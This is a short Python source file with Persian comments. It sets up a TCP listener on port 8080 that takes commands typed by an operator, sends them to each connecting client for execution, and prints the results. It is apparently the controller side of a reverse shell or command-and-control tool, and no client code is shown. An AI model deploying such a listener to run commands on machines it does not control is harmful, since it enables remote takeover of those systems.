import socket
import threading

# تنظیمات سرور
SERVER_IP = '0.0.0.0'  # آدرس IP عمومی یا داخلی سرور
SERVER_PORT = 8080  # پورت برای ارتباط با کلاینت‌ها

# تابعی برای مدیریت هر اتصال به سرور
def handle_client(client_socket, addr):
    print(f"Connection established with {addr}")

    while True:
        try:
            # دریافت دستور از کاربر (در سرور)
            command = input("Enter command to execute on client: ")

            # ارسال دستور به کلاینت
            client_socket.send(command.encode())

            # اگر دستور 'exit' باشد، اتصال بسته می‌شود
            if command.lower() == 'exit':
                print("Closing connection...")
                client_socket.close()
                break

            # دریافت نتیجه اجرای دستور از کلاینت
            result = client_socket.recv(4096).decode('utf-8')
            print(f"Result:\n{result}")

        except Exception as e:
            print(f"Error while communicating with client {addr}: {e}")
            break

# تابعی برای راه‌اندازی سرور
def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_IP, SERVER_PORT))
    server_socket.listen(5)  # پذیرش 5 اتصال همزمان

    print(f"Server started, listening on {SERVER_IP}:{SERVER_PORT}")

    while True:
        # پذیرش اتصال از کلاینت
        client_socket, addr = server_socket.accept()

        # ایجاد یک رشته جدید برای مدیریت هر اتصال
        client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_thread.start()

# شروع سرور
if __name__ == "__main__":
    start_server()
